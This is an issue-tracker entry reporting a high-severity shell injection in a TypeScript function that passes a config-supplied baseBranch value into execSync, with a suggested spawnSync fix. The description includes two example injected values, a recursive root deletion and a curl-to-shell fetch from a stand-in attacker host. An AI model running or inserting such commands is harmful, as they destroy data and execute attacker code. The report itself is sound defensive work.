---
title: Shell injection in hasNewCommit via unescaped baseBranch
created: 2026-04-19T10:13:00.000Z
status: backlog
severity: high
found-by: code-reviewer
files:
  - src/commands/run.ts:286
---

## Description

`hasNewCommit` at `src/commands/run.ts:286` interpolates `baseBranch` directly into an `execSync` shell string with no escaping:

```ts
const log = execSync(`git log ${baseBranch}..HEAD --oneline`, { cwd: worktreePath, ... });
```

`baseBranch` is read from `vteam.config.json` (a user-editable file). A value like `main; rm -rf /` or `$(curl attacker.com/payload | sh)` would execute arbitrary commands in the worktree directory. This is distinct from the already-known injections in `manager.ts` and `merge-request.ts`; this one has no quoting at all, making it immediately exploitable.

## Suggested Fix

Use `spawnSync` with an array of arguments instead of a template string, or at minimum shell-quote `baseBranch`:

```ts
import { spawnSync } from "node:child_process";

function hasNewCommit(worktreePath: string, baseBranch: string): boolean {
  const result = spawnSync(
    "git",
    ["log", `${baseBranch}..HEAD`, "--oneline"],
    { cwd: worktreePath, encoding: "utf-8" },
  );
  return result.status === 0 && result.stdout.trim().length > 0;
}
```

## Affected Files

- `src/commands/run.ts:286` — `baseBranch` interpolated directly into shell string passed to `execSync`
